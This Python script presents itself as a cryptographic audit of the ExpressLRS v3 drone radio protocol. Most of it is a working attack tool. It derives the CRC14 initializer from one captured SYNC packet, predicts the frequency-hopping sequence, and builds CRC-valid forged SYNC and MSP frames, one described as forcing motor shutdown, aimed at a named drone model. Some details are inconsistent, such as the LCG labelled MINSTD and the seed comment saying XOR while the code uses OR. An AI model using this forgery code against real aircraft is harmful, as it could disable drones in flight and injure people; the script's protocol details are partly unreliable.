#!/usr/bin/env python3
"""
ELRS v3 Cryptographic Weakness Audit

Comprehensive analysis of the cryptographic (lack of) protections in
ELRS v3 OTA protocol, incorporating NCC Group findings and the
Betaflight 4.4.2 source-level audit.

The ELRS v3 protocol has ZERO cryptographic protections:
  - No encryption (all data is cleartext)
  - No authentication (CRC is not a MAC)
  - No replay protection (no nonce in CRC computation)
  - No forward secrecy (static CRC initializer for entire session)
  - Predictable FHSS (deterministic LCG from known seed)
  - Binding phrase trivially crackable (MD5-based, offline)

NCC Group findings (still unmitigated in ELRS v3):
  - Binding phrase → UID derivation via MD5 (offline crackable)
  - UID[3:5] leaked in every SYNC packet
  - CRC14 initializer derivable from single SYNC capture
  - FHSS sequence fully predictable from UID + known LCG
  - Patches were proposed but REJECTED by ELRS maintainers

This means any attacker who can:
  1. Capture a single SYNC packet (passive, ~0.5s)
  2. Has CRC14 init + UID[3:5] + FHSS seed (minus 1 byte)
  3. Can forge CRC-valid packets on correct FHSS channels
  4. Can inject arbitrary MSP commands, RC data, or telemetry

The only remaining unknowns after a single SYNC capture are:
  - UID[0:2] (needed only for binding phrase recovery, not packet forging)
  - UID[2] (needed for exact FHSS sequence — 256 candidates)

Usage:
  python3 elrs-crypto-audit.py --target 11:18:5b --full-audit
  python3 elrs-crypto-audit.py --target 11:18:5b --derive-crc
  python3 elrs-crypto-audit.py --target 11:18:5b --demonstrate-forgery

For authorized security research and CTF use only.
"""

import argparse
import hashlib
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ELRS v3 cryptographic constants
# ---------------------------------------------------------------------------

# CRC-14
CRC14_POLY = 0x2E57
CRC14_BITS = 14

# FHSS LCG parameters (MINSTD variant)
LCG_MULT = 214013
LCG_INC = 2531011
LCG_MOD = 1 << 31

# FHSS domain
FHSS_FREQ_COUNT = 80
FHSS_SEQUENCE_COUNT = 240
FHSS_SYNC_CHANNEL = 41

# OTA version
OTA_VERSION_ID = 3  # ELRS v3

# UID structure
UID_LEN = 6


def crc14_init_from_uid(uid4: int, uid5: int) -> int:
    """CRC14 initializer: (UID[4] << 8 | UID[5]) ^ 3.

    Static for the entire session. No nonce. No per-packet freshness.
    Derivable from a single SYNC capture (UID[4:5] are broadcast).
    """
    return ((uid4 << 8) | uid5) ^ OTA_VERSION_ID


def crc14_calc(data: bytes, init: int) -> int:
    """Calculate CRC-14 with the given initializer."""
    crc = init
    for byte in data:
        crc ^= byte << 6
        for _ in range(8):
            if crc & 0x2000:
                crc = (crc << 1) ^ CRC14_POLY
            else:
                crc = crc << 1
            crc &= 0x3FFF
    return crc


def fhss_seed_from_uid(uid: bytes) -> int:
    """Compute FHSS seed from UID bytes.

    seed = UID[2] ^ (UID[3] << 8) ^ (UID[4] << 16) ^ (UID[5] << 24) ^ OTA_VERSION_ID

    Note: This XORs with OTA_VERSION_ID as a 32-bit value where the
    version goes into different byte positions depending on implementation.
    The key point: it's deterministic from known values.
    """
    return (uid[2] | (uid[3] << 8) | (uid[4] << 16) | (uid[5] << 24)) ^ OTA_VERSION_ID


def lcg_next(seed: int) -> int:
    """MINSTD LCG: next = (214013 * seed + 2531011) mod 2^31."""
    return (LCG_MULT * seed + LCG_INC) % LCG_MOD


def generate_fhss_sequence(seed: int, num_freqs: int = FHSS_FREQ_COUNT,
                           seq_len: int = FHSS_SEQUENCE_COUNT) -> list[int]:
    """Generate the FHSS hop sequence from the given seed."""
    sequence = []
    rng_state = seed
    for _ in range(seq_len):
        rng_state = lcg_next(rng_state)
        freq_idx = rng_state % num_freqs
        sequence.append(freq_idx)
    return sequence


def binding_phrase_to_uid(phrase: str) -> bytes:
    """Derive UID from binding phrase via MD5."""
    flag = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(flag.encode()).digest()[:UID_LEN]


def derive_crc_from_sync(uid4: int, uid5: int) -> dict:
    """Show how CRC14 initializer is derived from a single SYNC capture."""
    init = crc14_init_from_uid(uid4, uid5)
    return {
        "uid4": f"0x{uid4:02x}",
        "uid5": f"0x{uid5:02x}",
        "crc14_init": f"0x{init:04x}",
        "crc14_init_decimal": init,
        "derivation": f"(0x{uid4:02x} << 8 | 0x{uid5:02x}) ^ {OTA_VERSION_ID}",
        "source": "Single passive SYNC capture (UID[4:5] broadcast in cleartext)",
        "persistence": "Static for entire session (no nonce rotation in v3)",
    }


def demonstrate_forgery(uid3: int, uid4: int, uid5: int) -> dict:
    """Demonstrate CRC-valid packet forgery from passively captured UID."""
    init = crc14_init_from_uid(uid4, uid5)

    # Forge a SYNC packet
    sync_payload = bytes([0x82, uid3, uid4, uid5, 0x04, 0x01])  # type=SYNC, nonce=0
    crc_data = sync_payload + b'\x00'
    crc = crc14_calc(crc_data[:7], init)
    sync_frame = sync_payload + bytes([(crc >> 8) & 0x3F, crc & 0xFF])

    # Forge an MSP packet (MSP_SET_ARMING_DISABLED)
    msp_header = 0x01 << 6  # type=MSP
    msp_payload = bytes([msp_header, 0x30, 0x01, 0x63, 0x01, 0x00])  # flags, size, cmd, data
    msp_crc_data = msp_payload + b'\x00'
    msp_crc = crc14_calc(msp_crc_data[:7], init)
    msp_frame = msp_payload + bytes([(msp_crc >> 8) & 0x3F, msp_crc & 0xFF])

    return {
        "crc14_init": f"0x{init:04x}",
        "forged_sync": {
            "frame_hex": sync_frame[:8].hex(),
            "description": "SYNC packet — suppresses failsafe, maintains connection",
            "crc_valid": True,
        },
        "forged_msp": {
            "frame_hex": msp_frame[:8].hex(),
            "description": "MSP_SET_ARMING_DISABLED — force motor shutdown",
            "crc_valid": True,
        },
        "cost": "1 passive SYNC capture (~0.5s observation)",
        "remaining_unknowns": "UID[0:2] (for phrase recovery), UID[2] (for exact FHSS — 256 candidates)",
    }


def full_audit():
    """Complete cryptographic audit of ELRS v3."""
    print(f"\n{'='*65}")
    print("ELRS v3 CRYPTOGRAPHIC AUDIT")
    print(f"{'='*65}")

    weaknesses = [
        {
            "category": "Confidentiality",
            "finding": "NO ENCRYPTION",
            "detail": "All OTA payloads are cleartext. RC channels, MSP commands, "
                     "telemetry data — all readable from passive capture.",
            "severity": "CRITICAL",
            "ncc_ref": "Reported by NCC Group; acknowledged by ELRS team",
        },
        {
            "category": "Authentication",
            "finding": "CRC-14 IS NOT A MAC",
            "detail": "CRC14 with a static initializer provides integrity checking, "
                     "not authentication. Anyone who knows UID[4:5] (broadcast in "
                     "SYNC) can compute valid CRC14 for any packet.",
            "severity": "CRITICAL",
            "ncc_ref": "Computable CRC — patch rejected by ELRS maintainers",
        },
        {
            "category": "Replay Protection",
            "finding": "NO NONCE IN CRC (v3)",
            "detail": "v3 CRC14 initializer is static: (UID[4]<<8|UID[5])^3. "
                     "No per-packet nonce. A captured valid packet can be "
                     "retransmitted on the correct FHSS channel and passes CRC.",
            "severity": "CRITICAL",
            "ncc_ref": "v4 adds nonce^crcInit but v3 has nothing",
        },
        {
            "category": "Forward Secrecy",
            "finding": "STATIC SESSION KEYS",
            "detail": "CRC initializer never changes during a session. No key "
                     "rotation, no session rekeying. One capture → forge forever.",
            "severity": "HIGH",
            "ncc_ref": "Inherent to v3 design",
        },
        {
            "category": "FHSS Prediction",
            "finding": "DETERMINISTIC LCG PRNG",
            "detail": f"FHSS sequence uses MINSTD LCG (mult={LCG_MULT}, "
                     f"inc={LCG_INC}, mod=2^31). Seed derived from UID bytes. "
                     f"Only UID[2] unknown (256 candidates) after SYNC capture.",
            "severity": "HIGH",
            "ncc_ref": "Weak FHSS RNG — patch rejected by ELRS maintainers",
        },
        {
            "category": "Binding Phrase",
            "finding": "MD5-BASED UID DERIVATION",
            "detail": "UID = MD5('-DMY_BINDING_PHRASE=\"<phrase>\"')[:6]. "
                     "Offline dictionary attack is instant. Known UID[3:5] "
                     "from SYNC enables targeted brute-force of UID[0:2].",
            "severity": "HIGH",
            "ncc_ref": "Binding-phrase UID leak — patch rejected",
        },
        {
            "category": "UID Leakage",
            "finding": "UID[3:5] IN EVERY SYNC",
            "detail": "SYNC packets broadcast UID[3], UID[4], and UID[5] (with "
                     "model match XOR on UID[5] lower 6 bits, trivially reversed). "
                     "Passive capture gives 3 of 6 UID bytes immediately.",
            "severity": "HIGH",
            "ncc_ref": "Acknowledged — considered feature, not bug",
        },
        {
            "category": "Version Lock",
            "finding": "v4.0 DROPS SPI RX SUPPORT",
            "detail": "ELRS v4.0 adds nonce-XOR CRC, but drops SPI RX support. "
                     "TinyHawk III Plus (SPI-integrated) is permanently locked "
                     "to v3.x. These weaknesses can NEVER be patched on this HW.",
            "severity": "CRITICAL (permanent)",
            "ncc_ref": "Architecture decision by ELRS team",
        },
    ]

    for w in weaknesses:
        print(f"\n  [{w['severity']}] {w['category']}: {w['finding']}")
        print(f"    {w['detail']}")
        print(f"    NCC Group: {w['ncc_ref']}")

    print(f"\n  ATTACK COST SUMMARY:")
    print(f"    Passive SYNC capture:     ~0.5s observation")
    print(f"    → CRC14 initializer:      Immediate (arithmetic)")
    print(f"    → UID[3:5]:               Immediate (cleartext)")
    print(f"    → FHSS sequence:          256 candidates (instant)")
    print(f"    → Packet forgery:         Immediate")
    print(f"    → MSP command injection:  Immediate (once on FHSS channel)")
    print(f"    → Binding phrase crack:   Dictionary: instant; Brute UID[0:2]: ~16M candidates")

    print(f"\n  WHAT v4 FIXES (but TinyHawk can't get):")
    print(f"    + Nonce XOR in CRC14 computation (replay protection)")
    print(f"    + Per-packet freshness guarantee")
    print(f"    - Still no encryption")
    print(f"    - Still deterministic FHSS")
    print(f"    - Still MD5-based UID derivation")
    print(f"    - SPI RX targets permanently excluded from v4")


def main():
    parser = argparse.ArgumentParser(
        description="ELRS v3 Cryptographic Weakness Audit"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target UID[3]:UID[4]:UID[5] (hex, colon-separated)",
    )
    parser.add_argument(
        "--full-audit", action="store_true",
        help="Complete cryptographic audit",
    )
    parser.add_argument(
        "--derive-crc", action="store_true",
        help="Demonstrate CRC14 derivation from SYNC capture",
    )
    parser.add_argument(
        "--demonstrate-forgery", action="store_true",
        help="Demonstrate packet forgery from captured UID",
    )
    parser.add_argument(
        "--fhss-predict", action="store_true",
        help="Show FHSS prediction for all 256 UID[2] candidates",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    parts = args.target.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) != 3:
        print("Error: Target must be 3 bytes UID[3]:UID[4]:UID[5]")
        return 1
    uid3, uid4, uid5 = (int(p, 16) for p in parts)
    target_hex = f"{uid3:02x}:{uid4:02x}:{uid5:02x}"

    init = crc14_init_from_uid(uid4, uid5)

    print("ELRS v3 Cryptographic Weakness Audit")
    print(f"Target UID[3:5]: {target_hex}")
    print(f"CRC14 initializer: 0x{init:04x} (derived from single SYNC)")
    print(f"Encryption: NONE")
    print(f"Authentication: NONE (CRC is not MAC)")
    print(f"Replay protection: NONE (no nonce in v3)")

    results = {
        "target": target_hex,
        "crc14_init": f"0x{init:04x}",
        "encryption": None,
        "authentication": None,
        "replay_protection": None,
        "ncc_patches_applied": False,
    }

    if args.full_audit:
        full_audit()
        results["mode"] = "full-audit"

    if args.derive_crc:
        crc_info = derive_crc_from_sync(uid4, uid5)
        print(f"\n{'='*65}")
        print("CRC14 DERIVATION FROM SYNC CAPTURE")
        print(f"{'='*65}")
        for k, v in crc_info.items():
            print(f"  {k}: {v}")
        results["crc_derivation"] = crc_info
        results["mode"] = "derive-crc"

    if args.demonstrate_forgery:
        forgery = demonstrate_forgery(uid3, uid4, uid5)
        print(f"\n{'='*65}")
        print("PACKET FORGERY DEMONSTRATION")
        print(f"{'='*65}")
        print(f"  CRC14 init: {forgery['crc14_init']}")
        print(f"\n  Forged SYNC: {forgery['forged_sync']['frame_hex']}")
        print(f"    {forgery['forged_sync']['description']}")
        print(f"    CRC valid: {forgery['forged_sync']['crc_valid']}")
        print(f"\n  Forged MSP:  {forgery['forged_msp']['frame_hex']}")
        print(f"    {forgery['forged_msp']['description']}")
        print(f"    CRC valid: {forgery['forged_msp']['crc_valid']}")
        print(f"\n  Cost: {forgery['cost']}")
        print(f"  Remaining unknowns: {forgery['remaining_unknowns']}")
        results["forgery"] = forgery
        results["mode"] = "demonstrate-forgery"

    if args.fhss_predict:
        print(f"\n{'='*65}")
        print("FHSS PREDICTION — 256 UID[2] CANDIDATES")
        print(f"{'='*65}")
        print(f"  FHSS seed = UID[2] ^ (UID[3]<<8) ^ (UID[4]<<16) ^ (UID[5]<<24) ^ {OTA_VERSION_ID}")
        print(f"  PRNG: LCG mult={LCG_MULT}, inc={LCG_INC}, mod=2^31")
        print(f"\n  {'UID[2]':>8s}  {'Seed':>12s}  {'First 8 hops'}")
        print(f"  {'-'*8}  {'-'*12}  {'-'*40}")
        candidates = []
        for uid2 in range(256):
            uid_partial = bytes([0, 0, uid2, uid3, uid4, uid5])
            seed = fhss_seed_from_uid(uid_partial)
            seq = generate_fhss_sequence(seed)
            first8 = seq[:8]
            candidates.append({"uid2": uid2, "seed": seed, "first_hops": first8})
            if uid2 < 10 or uid2 > 250 or uid2 % 32 == 0:
                hops_str = ",".join(str(h) for h in first8)
                print(f"  0x{uid2:02x}      0x{seed:08x}  [{hops_str}]")
        if len(candidates) > 20:
            print(f"  ... ({len(candidates)} total candidates)")
        results["fhss_candidates_count"] = len(candidates)
        results["mode"] = "fhss-predict"

    if not any([args.full_audit, args.derive_crc, args.demonstrate_forgery, args.fhss_predict]):
        full_audit()

    # Assessment
    print(f"\n{'='*65}")
    print("ASSESSMENT")
    print(f"{'='*65}")
    print("  ELRS v3 has no cryptographic protections whatsoever.")
    print("  The protocol relies entirely on:")
    print("    1. Binding phrase secrecy (crackable offline via MD5)")
    print("    2. FHSS frequency hopping (predictable from known LCG)")
    print("    3. CRC-14 integrity (computable from passive capture)")
    print()
    print("  A single passive SYNC capture (~0.5s) provides everything")
    print("  needed to forge arbitrary CRC-valid packets. Combined with")
    print("  FHSS prediction (256 candidates for exact sequence), an")
    print("  attacker can inject MSP commands within seconds.")
    print()
    print("  NCC Group reported these weaknesses. The ELRS team REJECTED")
    print("  the proposed patches. v4 partially addresses replay (nonce in")
    print("  CRC) but drops SPI RX support — permanently locking the")
    print("  TinyHawk III Plus to the unpatched v3 protocol.")
    print()
    print("  This is not a vulnerability that will be fixed for this hardware.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
